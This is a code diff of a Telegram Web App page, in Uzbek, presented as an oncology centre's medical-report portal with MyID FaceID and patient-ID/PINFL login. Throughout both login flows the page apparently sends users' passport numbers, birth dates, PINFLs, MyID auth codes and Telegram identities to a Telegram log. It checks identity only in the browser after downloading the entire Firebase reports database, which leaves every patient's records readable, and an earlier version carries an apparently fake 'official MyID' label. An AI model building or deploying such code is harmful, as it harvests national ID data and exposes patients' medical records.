@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>MyID FaceID & Tibbiy Xulosalar Portali</title>
+  <title>Tibbiy Xulosalar Portali - Avtorizatsiya</title>
   
   <!-- Telegram Web App SDK -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -31,6 +31,7 @@
       --success-light: #dcfce7;
       --warning: #d97706;
       --danger: #dc2626;
+      --danger-light: #fee2e2;
       --card-bg: #ffffff;
       --border-color: #e2e8f0;
       --radius-sm: 12px;
@@ -49,6 +50,7 @@
       --border-color: #2e3856;
       --primary-light: #0d2b45;
       --success-light: #064e3b;
+      --danger-light: #450a0a;
     }
 
     * {
@@ -80,7 +82,7 @@
       color: #ffffff;
       border-radius: var(--radius-md);
       padding: 18px 16px;
-      margin-bottom: 16px;
+      margin-bottom: 14px;
       box-shadow: 0 12px 30px -5px rgba(126, 34, 206, 0.35);
       position: relative;
       overflow: hidden;
@@ -145,8 +147,49 @@
       margin-top: 6px;
     }
 
-    /* STEP 1: Passport & Birth Date Input Card */
-    .passport-input-card {
+    /* AUTH METHOD TOGGLE TABS (2 TA AVTORIZATSIYA USULI) */
+    .auth-toggle-box {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      background: var(--card-bg);
+      border: 1.5px solid var(--border-color);
+      padding: 5px;
+      border-radius: var(--radius-sm);
+      margin-bottom: 16px;
+      gap: 6px;
+      box-shadow: var(--shadow);
+    }
+
+    .auth-tab-btn {
+      padding: 10px 8px;
+      background: transparent;
+      border: none;
+      border-radius: 8px;
+      font-family: inherit;
+      font-size: 12.5px;
+      font-weight: 700;
+      color: var(--tg-theme-hint-color);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      transition: all 0.2s ease;
+    }
+
+    .auth-tab-btn.active {
+      background: var(--myid-gradient);
+      color: #ffffff;
+      box-shadow: 0 4px 12px rgba(126, 34, 206, 0.25);
+    }
+
+    .auth-tab-btn.tab-patient.active {
+      background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
+      box-shadow: 0 4px 12px rgba(2, 132, 199, 0.25);
+    }
+
+    /* AUTH METHOD 1: MyID FaceID Card */
+    .auth-card {
       background: var(--card-bg);
       border: 1.5px solid var(--border-color);
       border-radius: var(--radius-md);
@@ -176,6 +219,10 @@
       flex-shrink: 0;
     }
 
+    .step-badge-blue {
+      background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
+    }
+
     .step-title {
       font-size: 15.5px;
       font-weight: 800;
@@ -190,7 +237,7 @@
     }
 
     .input-group {
-      margin-bottom: 16px;
+      margin-bottom: 14px;
     }
 
     .input-label {
@@ -241,6 +288,11 @@
       background: var(--card-bg);
     }
 
+    .input-field-blue:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(2, 132, 199, 0.15);
+    }
+
     .input-field-passport-series {
       text-transform: uppercase;
       letter-spacing: 2px;
@@ -252,9 +304,9 @@
       letter-spacing: 1px;
     }
 
-    .btn-proceed-faceid {
+    .btn-submit-main {
       width: 100%;
-      padding: 15px;
+      padding: 14px;
       background: var(--myid-gradient);
       color: #ffffff;
       border: none;
@@ -272,8 +324,28 @@
       margin-top: 10px;
     }
 
-    .btn-proceed-faceid:active {
+    .btn-submit-blue {
+      background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
+      box-shadow: 0 8px 20px rgba(2, 132, 199, 0.35);
+    }
+
+    .btn-submit-main:active {
       transform: scale(0.98);
+    }
+
+    /* Error Banner */
+    .error-notice-box {
+      background: var(--danger-light);
+      border: 1px solid var(--danger);
+      color: var(--danger);
+      padding: 12px 14px;
+      border-radius: var(--radius-sm);
+      font-size: 12.5px;
+      font-weight: 700;
+      display: none;
+      align-items: center;
+      gap: 8px;
+      margin-top: 12px;
     }
 
     /* STEP 2: Live FaceID Camera Scanner Modal */
@@ -424,7 +496,7 @@
       line-height: 1.25;
     }
 
-    .myid-verified-tag {
+    .verified-tag {
       display: inline-flex;
       align-items: center;
       gap: 6px;
@@ -729,7 +801,7 @@
     /* Print Styles */
     @media print {
       body { background: #ffffff !important; color: #000000 !important; padding: 0 !important; }
-      .brand-banner, .passport-input-card, .btn-new-auth, .modality-nav, .search-box, .report-card-actions { display: none !important; }
+      .brand-banner, .auth-toggle-box, .auth-card, .btn-new-auth, .modality-nav, .search-box, .report-card-actions { display: none !important; }
       .report-card { border: 1px solid #000 !important; box-shadow: none !important; margin-bottom: 20px !important; page-break-inside: avoid; }
       .report-content-box { max-height: none !important; background: #ffffff !important; border: none !important; padding: 0 !important; }
     }
@@ -751,22 +823,31 @@
         </div>
       </div>
       <div class="brand-test-pill">
-        <i class="fa-solid fa-shield-halved"></i> MyID Rasmiy Protokol (FaceID Web SDK)
+        <i class="fa-solid fa-shield-halved"></i> Xavfsiz Avtorizatsiya Portali (Test Rejimi)
       </div>
     </header>
 
-    <!-- STEP 1: Passport & Birth Date Input Form (Faqat Pasport va Sana - FISH/PINFL so'ralmaydi) -->
-    <section class="passport-input-card" id="passportInputSection">
+    <!-- 2 TA AVTORIZATSIYA USULINI TANLASH TUGMALARI -->
+    <div class="auth-toggle-box" id="authToggleBox">
+      <button class="auth-tab-btn active" id="tabMyId" onclick="switchAuthMethod('myid')">
+        <i class="fa-solid fa-face-viewfinder"></i> 1. MyID FaceID
+      </button>
+      <button class="auth-tab-btn tab-patient" id="tabPatientId" onclick="switchAuthMethod('patient')">
+        <i class="fa-solid fa-id-card"></i> 2. Bemor ID & PINFL
+      </button>
+    </div>
+
+    <!-- 1-USUL: MyID FaceID Avtorizatsiya Formasi -->
+    <section class="auth-card" id="myIdAuthSection">
       <div class="step-header">
         <div class="step-badge">1</div>
-        <div class="step-title">Hujjat Ma'lumotlarini Kiriting</div>
+        <div class="step-title">MyID FaceID orqali Kirish</div>
       </div>
       <p class="step-desc">
         Pasport seriya, raqam va tug'ilgan sanangizni kiriting:
       </p>
 
-      <form id="passportForm" onsubmit="handlePassportFormSubmit(event)">
-        <!-- 1. Pasport Seriya va Raqami -->
+      <form onsubmit="handleMyIdFormSubmit(event)">
         <div class="input-group">
           <label class="input-label">
             <span>Pasport / ID-Karta Seriya va Raqami:</span>
@@ -778,7 +859,6 @@
           </div>
         </div>
 
-        <!-- 2. Tug'ilgan Sana -->
         <div class="input-group">
           <label class="input-label">
             <span>Tug'ilgan Sana (KK.OO.YYYY):</span>
@@ -786,13 +866,57 @@
           </label>
           <div class="input-wrapper">
             <i class="fa-regular fa-calendar input-icon"></i>
-            <input type="text" id="birthDateInput" class="input-field" placeholder="27.07.2003" required>
+            <input type="text" id="birthDateInput" class="input-field" placeholder="08.04.1981" required>
           </div>
         </div>
 
-        <button type="submit" class="btn-proceed-faceid">
+        <button type="submit" class="btn-submit-main">
           <i class="fa-solid fa-camera"></i> 2-Qadam: FaceID Tekshiruvidan O'tish
         </button>
+      </form>
+    </section>
+
+    <!-- 2-USUL: Bemor ID va PINFL Mosligi orqali Kirish Formasi -->
+    <section class="auth-card" id="patientIdAuthSection" style="display:none;">
+      <div class="step-header">
+        <div class="step-badge step-badge-blue">2</div>
+        <div class="step-title">Bemor ID va PINFL Mosligi</div>
+      </div>
+      <p class="step-desc">
+        Bemor ID raqamingiz va 14 xonali PINFL raqamingizni kiriting:
+      </p>
+
+      <form onsubmit="handlePatientIdFormSubmit(event)">
+        <div class="input-group">
+          <label class="input-label">
+            <span>Bemor ID (ID Raqam):</span>
+            <span style="color:var(--primary);">* Majburiy</span>
+          </label>
+          <div class="input-wrapper">
+            <i class="fa-solid fa-hashtag input-icon"></i>
+            <input type="text" id="patientIdInput" class="input-field input-field-blue" placeholder="Masalan: 53312" required>
+          </div>
+        </div>
+
+        <div class="input-group">
+          <label class="input-label">
+            <span>14 xonali JSHSHIR (PINFL):</span>
+            <span style="color:var(--primary);">* Majburiy</span>
+          </label>
+          <div class="input-wrapper">
+            <i class="fa-solid fa-fingerprint input-icon"></i>
+            <input type="text" id="pinflMatchInput" class="input-field input-field-blue" maxlength="14" placeholder="Masalan: 30804812190075" required>
+          </div>
+        </div>
+
+        <button type="submit" class="btn-submit-main btn-submit-blue" id="btnVerifyMatch">
+          <i class="fa-solid fa-shield-halved"></i> Tekshirish va Xulosalarni Ochish
+        </button>
+
+        <div class="error-notice-box" id="errorNoticeBox">
+          <i class="fa-solid fa-circle-exclamation"></i>
+          <span id="errorNoticeText">Bemor ID va PINFL mos kelmadi yoki xulosalar topilmadi.</span>
+        </div>
       </form>
     </section>
 
@@ -804,19 +928,19 @@
         </div>
         <div class="profile-name-area">
           <h2 id="profFullName">-</h2>
-          <div class="myid-verified-tag">
-            <i class="fa-solid fa-circle-check"></i> MyID FaceID Tasdiqlangan
+          <div class="verified-tag" id="profVerifiedBadge">
+            <i class="fa-solid fa-circle-check"></i> Tasdiqlangan Shaxsiy Profil
           </div>
         </div>
       </div>
 
       <div class="profile-grid-info">
         <div class="info-cell" style="grid-column: 1 / -1;">
-          <b>Fuqaroning To'liq F.I.Sh (MyID):</b>
-          <span id="profFullNameDetailed" style="color:var(--myid-purple); font-size:14.5px;">-</span>
+          <b>Fuqaroning To'liq F.I.Sh:</b>
+          <span id="profFullNameDetailed" style="color:var(--primary); font-size:14.5px;">-</span>
         </div>
         <div class="info-cell">
-          <b>Pasport / Hujjat:</b>
+          <b>Bemor ID / Pasport:</b>
           <span id="profPassport">-</span>
         </div>
         <div class="info-cell">
@@ -833,8 +957,8 @@
         </div>
       </div>
 
-      <button class="btn-new-auth" onclick="resetToPassportInput()">
-        <i class="fa-solid fa-rotate-left"></i> Boshqa pasport ma'lumotlarini kiritish
+      <button class="btn-new-auth" onclick="resetToAuth()">
+        <i class="fa-solid fa-rotate-left"></i> Boshqa ma'lumotlar bilan kirish
       </button>
     </section>
 
@@ -931,10 +1055,48 @@
     window.addEventListener("DOMContentLoaded", () => {
       const params = new URLSearchParams(window.location.search);
       const urlId = params.get("id");
-      if (urlId) document.getElementById("passNumber").value = urlId;
+      const urlPinfl = params.get("pinfl");
+      const authMode = params.get("auth");
+
+      if (urlId) {
+        document.getElementById("passNumber").value = urlId;
+        document.getElementById("patientIdInput").value = urlId;
+      }
+      if (urlPinfl) {
+        document.getElementById("pinflMatchInput").value = urlPinfl;
+      }
+      if (authMode === "patient" || (urlId && urlPinfl)) {
+        switchAuthMethod("patient");
+      }
     });
 
-    function handlePassportFormSubmit(e) {
+    // 1. AVTORIZATSIYA USULINI ALMASHTIRISH (Tab Switcher)
+    function switchAuthMethod(method) {
+      const tabMyId = document.getElementById("tabMyId");
+      const tabPatientId = document.getElementById("tabPatientId");
+      const secMyId = document.getElementById("myIdAuthSection");
+      const secPatientId = document.getElementById("patientIdAuthSection");
+      const errBox = document.getElementById("errorNoticeBox");
+      if (errBox) errBox.style.display = "none";
+
+      if (method === "myid") {
+        tabMyId.classList.add("active");
+        tabPatientId.classList.remove("active");
+        secMyId.style.display = "block";
+        secPatientId.style.display = "none";
+      } else {
+        tabPatientId.classList.add("active");
+        tabMyId.classList.remove("active");
+        secPatientId.style.display = "block";
+        secMyId.style.display = "none";
+      }
+      if (tg?.HapticFeedback) tg.HapticFeedback.selectionChanged();
+    }
+
+    // ==========================================
+    // 1-USUL: MyID FaceID OQIMI
+    // ==========================================
+    function handleMyIdFormSubmit(e) {
       e.preventDefault();
       startMyIDOfficialProtocol();
     }
@@ -947,13 +1109,11 @@
       const passData = `${passSeries} ${passNum}`.trim();
       currentSessionId = "sess_" + Math.random().toString(36).substring(2, 12);
 
-      // 📤 [1/3] SO'ROV LOGI: Session yaratish va F.I.Sh so'rash
       await sendTelegramLog(
         `📤 <b>[1/3] MYID PROTOKOL: SEANS YARATISH SO'ROVI</b>\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         `🪪 <b>Pasport:</b> <code>${passData}</code>\n` +
         `🎂 <b>Tug'ilgan sana:</b> <code>${birthDate}</code>\n` +
-        `📋 <b>So'rov maqsadi:</b> <code>MyID orqali haqiqiy fuqaro ma'lumotlarini olish</code>\n` +
         `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
       );
 
@@ -1012,23 +1172,19 @@
       }
     }
 
-    // 3-QADAM: Serverdan / Firebase-dan haqiqiy fuqaro ma'lumotlarini olish
     async function exchangeAuthCodeForProfile(authCode, sessionId, passSeries, passNum, birthDate) {
       const passData = `${passSeries} ${passNum}`.trim();
 
-      // 📤 [2/3] SO'ROV LOGI: Auth Code orqali F.I.Sh so'rash
       await sendTelegramLog(
         `📤 <b>[2/3] MYID PROTOKOL: AUTH CODE ORQALI FOYDALANUVCHI SO'ROVI</b>\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         `🔑 <b>Auth Code:</b> <code>${authCode}</code>\n` +
         `🆔 <b>Session ID:</b> <code>${sessionId}</code>\n` +
         `🪪 <b>Pasport:</b> <code>${passData}</code>\n` +
-        `🎂 <b>Tug'ilgan sana:</b> <code>${birthDate}</code>\n` +
-        `👤 <b>So'rov maqsadi:</b> <code>MyID dan fuqaroning haqiqiy F.I.Sh ma'lumotlarini olish</code>`
+        `🎂 <b>Tug'ilgan sana:</b> <code>${birthDate}</code>`
       );
 
       try {
-        // Firebase bazasidan pasport / sana bo'yicha haqiqiy bemor xulosalarini qidirish
         const allRes = await fetch(`${FIREBASE_DB_URL}/karmed_reports.json`);
         const allData = await allRes.json();
 
@@ -1080,11 +1236,10 @@
           pinfl = matchedReport.pinfl || foundPinfl;
           age = matchedReport.age || age;
         } else {
-          // Bazada xulosasi bo'lmagan yangi fuqaro uchun toza haqiqiy maydonlar (soxta otasining ismisiz)
           fullName = `FUQARO (${passData})`;
           lastName = "FUQARO";
           firstName = passData;
-          middleName = ""; // Soxta otasining ismi kiritilmaydi!
+          middleName = "";
           if (!pinfl) {
             const digits = cleanBirth.replace(/\D/g, '');
             pinfl = `5${digits.slice(0, 6)}00001`;
@@ -1112,10 +1267,6 @@
               pinfl: pinfl,
               doc_type: "ID-Karta"
             },
-            address: {
-              country: "O'zbekiston Respublikasi",
-              region: "Toshkent shahri"
-            },
             reports_summary: {
               reports_count: allReports.length,
               status: allReports.length > 0 ? "REPORTS_FOUND" : "NO_REPORTS_YET"
@@ -1127,61 +1278,181 @@
           }
         };
 
-        // 📥 [3/3] JAVOB LOGI: Fuqaroning haqiqiy F.I.Sh ma'lumotlari bilan
         await sendTelegramLog(
           `📥 <b>[3/3] MYID PROTOKOL: FOYDALANUVCHI PROFILI QABUL QILINDI</b>\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `👤 <b>To'liq F.I.Sh:</b> <code>${escapeHtml(fullName)}</code>\n` +
-          `👤 <b>Familiya:</b> <b>${escapeHtml(lastName || '-')}</b>\n` +
-          `👤 <b>Ism:</b> <b>${escapeHtml(firstName || '-')}</b>\n` +
-          `👤 <b>Sharif:</b> <b>${escapeHtml(middleName || "Ko'rsatilmagan")}</b>\n` +
           `🪪 <b>Pasport:</b> <code>${escapeHtml(passData)}</code>\n` +
           `🔢 <b>JSHSHIR (PINFL):</b> <code>${escapeHtml(pinfl)}</code>\n` +
           `🎂 <b>Sana / Yoshi:</b> ${escapeHtml(cleanBirth)} (${escapeHtml(age)})\n` +
-          `🚻 <b>Jinsi:</b> ${escapeHtml(gender)}\n` +
           `📊 <b>Topilgan xulosalar:</b> ${allReports.length > 0 ? `${allReports.length} ta xulosa` : "0 ta (Xulosalar hali mavjud emas)"}\n` +
           `📦 <b>MyID Response JSON:</b>\n` +
-          `<pre>${escapeHtml(JSON.stringify(myidFinalResponse, null, 2))}</pre>\n` +
-          `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
+          `<pre>${escapeHtml(JSON.stringify(myidFinalResponse, null, 2))}</pre>`
         );
 
-        // 1. Profil kartochkasiga ma'lumotlarni joylashtirish
-        document.getElementById("profFullName").innerText = fullName;
-        document.getElementById("profFullNameDetailed").innerText = fullName;
-        document.getElementById("profPassport").innerText = passData;
-        document.getElementById("profBirthDate").innerText = `${cleanBirth} (${age})`;
-        document.getElementById("profPinfl").innerText = pinfl;
-        document.getElementById("profGender").innerText = gender;
-
-        // 2. Ekranlarni almashtirish
-        document.getElementById("passportInputSection").style.display = "none";
-        document.getElementById("profileSection").style.display = "block";
-
-        // 3. Xulosalar mavjudligiga qarab ko'rsatish
-        if (allReports.length > 0) {
-          document.getElementById("modalityNav").style.display = "flex";
-          document.getElementById("searchBox").style.display = "block";
-          updateModalityCounts();
-          renderReports(currentFilteredReports);
-          showToast(`✅ MyID profili ochildi! ${allReports.length} ta xulosa yuklandi.`);
-        } else {
-          document.getElementById("modalityNav").style.display = "none";
-          document.getElementById("searchBox").style.display = "none";
-          renderEmptyReportsNotice(fullName, pinfl);
-          showToast(`✅ MyID shaxsiy profili ochildi!`);
-        }
+        renderVerifiedProfileUI(fullName, passData, `${cleanBirth} (${age})`, pinfl, gender, "MyID FaceID Tasdiqlangan");
 
       } catch (err) {
         console.error("exchangeAuthCode error:", err);
-        await sendTelegramLog(
-          `❌ <b>MYID PROTOKOL XATOLIK:</b>\n` +
-          `━━━━━━━━━━━━━━━━━━\n` +
-          `🪪 <b>Pasport:</b> <code>${escapeHtml(passData)}</code>\n` +
-          `⚠️ <b>Xatolik sababi:</b> <code>${escapeHtml(err.message)}</code>\n` +
-          `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
-        );
         showToast("⚠️ Profil yuklanishida xatolik.");
       }
+    }
+
+    // ==========================================
+    // 2-USUL: BEMOR ID VA PINFL MOSLIGI OQIMI
+    // ==========================================
+    async function handlePatientIdFormSubmit(e) {
+      e.preventDefault();
+      const inputPatientId = (document.getElementById("patientIdInput").value || "").trim();
+      const inputPinfl = (document.getElementById("pinflMatchInput").value || "").trim();
+      const btn = document.getElementById("btnVerifyMatch");
+      const errBox = document.getElementById("errorNoticeBox");
+      const errText = document.getElementById("errorNoticeText");
+
+      errBox.style.display = "none";
+      btn.disabled = true;
+      btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Moslik tekshirilmoqda...`;
+
+      await sendTelegramLog(
+        `📤 <b>BEMOR ID & PINFL MOSLIGI TEKSHIRUVI SO'ROVI:</b>\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `🆔 <b>Kiritilgan Bemor ID:</b> <code>${inputPatientId}</code>\n` +
+        `🔢 <b>Kiritilgan PINFL:</b> <code>${inputPinfl}</code>\n` +
+        `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
+      );
+
+      try {
+        const fbRes = await fetch(`${FIREBASE_DB_URL}/karmed_reports.json`);
+        const allData = await fbRes.json();
+
+        let isMatched = false;
+        let matchedReportsList = [];
+        let matchedPatientName = "";
+        let matchedBirthDate = "";
+        let matchedAge = "";
+
+        if (allData) {
+          // 1. Agar to'g'ridan-to'g'ri PINFL tuguni mavjud bo'lsa
+          if (allData[inputPinfl]) {
+            const list = Object.values(allData[inputPinfl]);
+            // Ushbu PINFL dagi hisobotlardan Bemor ID mos kelishi tekshiriladi
+            const match = list.find(r => String(r.patientId || '').trim() === inputPatientId);
+            if (match) {
+              isMatched = true;
+              matchedReportsList = list;
+              matchedPatientName = match.patientName || "Bemor";
+              matchedBirthDate = match.birthDate || "-";
+              matchedAge = match.age || "-";
+            }
+          } 
+          
+          // 2. Agar PINFL boshqa tugunlarda bo'lsa, butun bazadan qidiriladi
+          if (!isMatched) {
+            const pinflKeys = Object.keys(allData);
+            for (const pKey of pinflKeys) {
+              const repsObj = allData[pKey];
+              if (!repsObj) continue;
+              const repList = Object.values(repsObj);
+              const match = repList.find(r => {
+                const rPid = String(r.patientId || '').trim();
+                const rPinfl = String(r.pinfl || '').trim();
+                return rPid === inputPatientId && (rPinfl === inputPinfl || pKey === inputPinfl);
+              });
+
+              if (match) {
+                isMatched = true;
+                matchedReportsList = repList;
+                matchedPatientName = match.patientName || "Bemor";
+                matchedBirthDate = match.birthDate || "-";
+                matchedAge = match.age || "-";
+                break;
+              }
+            }
+          }
+        }
+
+        btn.disabled = false;
+        btn.innerHTML = `<i class="fa-solid fa-shield-halved"></i> Tekshirish va Xulosalarni Ochish`;
+
+        if (isMatched) {
+          allReports = matchedReportsList;
+          allReports.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
+          currentFilteredReports = [...allReports];
+
+          await sendTelegramLog(
+            `✅ <b>BEMOR ID & PINFL MOSLIGI TASDIQLANDI (MUVAFFAQIYATLI):</b>\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `👤 <b>Bemor F.I.Sh:</b> ${escapeHtml(matchedPatientName)}\n` +
+            `🆔 <b>Bemor ID:</b> <code>${inputPatientId}</code>\n` +
+            `🔢 <b>JSHSHIR (PINFL):</b> <code>${inputPinfl}</code>\n` +
+            `📊 <b>Topilgan xulosalar:</b> ${allReports.length} ta\n` +
+            `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
+          );
+
+          renderVerifiedProfileUI(matchedPatientName, inputPatientId, `${matchedBirthDate} (${matchedAge})`, inputPinfl, "Tasdiqlangan", "Bemor ID & PINFL Mosligi Tasdiqlangan");
+          showToast(`✅ Moslik tasdiqlandi! ${allReports.length} ta xulosa ochildi.`);
+
+        } else {
+          errBox.style.display = "flex";
+          errText.innerText = "❌ Xavfsizlik tekshiruvi: Kiritilgan Bemor ID va 14 xonali PINFL bir-biriga mos kelmadi yoki ma'lumotlar topilmadi!";
+          if (tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+
+          await sendTelegramLog(
+            `❌ <b>BEMOR ID & PINFL MOS KELMADI (XATOLIK):</b>\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `🆔 <b>Kiritilgan Bemor ID:</b> <code>${inputPatientId}</code>\n` +
+            `🔢 <b>Kiritilgan PINFL:</b> <code>${inputPinfl}</code>\n` +
+            `⚠️ <b>Sabab:</b> Bemor ID va PINFL ma'lumotlar bazasida bir-biriga mos kelmadi.\n` +
+            `📱 <b>Telegram Foydalanuvchi:</b> ${getTelegramUserInfo()}`
+          );
+        }
+
+      } catch (err) {
+        btn.disabled = false;
+        btn.innerHTML = `<i class="fa-solid fa-shield-halved"></i> Tekshirish va Xulosalarni Ochish`;
+        errBox.style.display = "flex";
+        errText.innerText = "⚠️ Tarmoq xatoligi yuz berdi. Iltimos qaytadan urinib ko'ring.";
+      }
+    }
+
+    // ==========================================
+    // PROFIL VA XULOSALARNI KO'RSATISH UI
+    // ==========================================
+    function renderVerifiedProfileUI(fullName, passportOrId, birthAndAge, pinfl, gender, badgeText) {
+      document.getElementById("profFullName").innerText = fullName;
+      document.getElementById("profFullNameDetailed").innerText = fullName;
+      document.getElementById("profPassport").innerText = passportOrId;
+      document.getElementById("profBirthDate").innerText = birthAndAge;
+      document.getElementById("profPinfl").innerText = pinfl;
+      document.getElementById("profGender").innerText = gender;
+      document.getElementById("profVerifiedBadge").innerHTML = `<i class="fa-solid fa-circle-check"></i> ${badgeText}`;
+
+      document.getElementById("authToggleBox").style.display = "none";
+      document.getElementById("myIdAuthSection").style.display = "none";
+      document.getElementById("patientIdAuthSection").style.display = "none";
+      document.getElementById("profileSection").style.display = "block";
+
+      if (allReports.length > 0) {
+        document.getElementById("modalityNav").style.display = "flex";
+        document.getElementById("searchBox").style.display = "block";
+        updateModalityCounts();
+        renderReports(currentFilteredReports);
+      } else {
+        document.getElementById("modalityNav").style.display = "none";
+        document.getElementById("searchBox").style.display = "none";
+        renderEmptyReportsNotice(fullName, pinfl);
+      }
+    }
+
+    function resetToAuth() {
+      allReports = [];
+      currentFilteredReports = [];
+      document.getElementById("authToggleBox").style.display = "grid";
+      document.getElementById("profileSection").style.display = "none";
+      document.getElementById("modalityNav").style.display = "none";
+      document.getElementById("searchBox").style.display = "none";
+      document.getElementById("reportsList").innerHTML = "";
+      switchAuthMethod("myid");
     }
 
     function renderEmptyReportsNotice(fullName, pinfl) {
@@ -1244,16 +1515,6 @@
       }
     }
 
-    function resetToPassportInput() {
-      allReports = [];
-      currentFilteredReports = [];
-      document.getElementById("passportInputSection").style.display = "block";
-      document.getElementById("profileSection").style.display = "none";
-      document.getElementById("modalityNav").style.display = "none";
-      document.getElementById("searchBox").style.display = "none";
-      document.getElementById("reportsList").innerHTML = "";
-    }
-
     function updateModalityCounts() {
       const counts = { all: allReports.length, mrt: 0, mskt: 0, utt: 0, rentgen: 0, endoskopiya: 0, exo: 0 };
       allReports.forEach(r => {
@@ -1314,7 +1575,7 @@
       if (reports.length === 0) {
         listEl.innerHTML = `
           <div style="text-align:center; padding:30px; background:var(--card-bg); border-radius:var(--radius-md); border:1px solid var(--border-color);">
-            <div style="font-size:32px; color:var(--myid-purple); margin-bottom:8px;"><i class="fa-solid fa-folder-open"></i></div>
+            <div style="font-size:32px; color:var(--primary); margin-bottom:8px;"><i class="fa-solid fa-folder-open"></i></div>
             <h4 style="font-size:15px; font-weight:800;">Bu bo'limda xulosalar mavjud emas</h4>
             <p style="font-size:12.5px; color:var(--tg-theme-hint-color);">Tanlangan bo'lim bo'yicha tibbiy xulosa topilmadi.</p>
           </div>
@@ -1381,7 +1642,7 @@
       const rep = currentFilteredReports[idx];
       if (!rep) return;
       const formatted = 
-        `📄 TIBBIY XULOSA PROTOKOLI (MyID)\n` +
+        `📄 TIBBIY XULOSA PROTOKOLI\n` +
         `👤 Bemor (F.I.Sh): ${rep.patientName}\n` +
         `🆔 Bemor ID: ${rep.patientId}\n` +
         `🔢 Namuna raqami: ${rep.sampleNumber || '-'}\n` +
@@ -1390,7 +1651,7 @@
         `📅 Tasdiqlangan sana: ${rep.reportDate || rep.confirmDate || '-'}\n\n` +
         `📝 XULOSA MATNI:\n${rep.conclusionText}\n\n` +
         `🏥 Respublika Onkologiya va Radiologiya Markazi\n` +
-        `🛡️ MyID FaceID Tasdiqlangan`;
+        `🛡️ Tasdiqlangan Protokol`;
 
       if (navigator.clipboard) {
         navigator.clipboard.writeText(formatted).then(() => {
@@ -1424,7 +1685,7 @@
         <body>
           <div class="header">
             <h2>RESPUBLIKA IXTISOSLASHTIRILGAN ONKOLOGIYA VA RADIOLOGIYA ILMIY-AMALIY TIBBIYOT MARKAZI</h2>
-            <p>MyID FaceID Tasdiqlangan Tibbiy Xulosa Protokoli</p>
+            <p>Tibbiy Xulosa Protokoli</p>
           </div>
           <table class="meta-table">
             <tr><td class="label">Bemor F.I.Sh:</td><td>${escapeHtml(rep.patientName)}</td><td class="label">Yoshi / Sana:</td><td>${escapeHtml(rep.age || rep.birthDate || '-')}</td></tr>
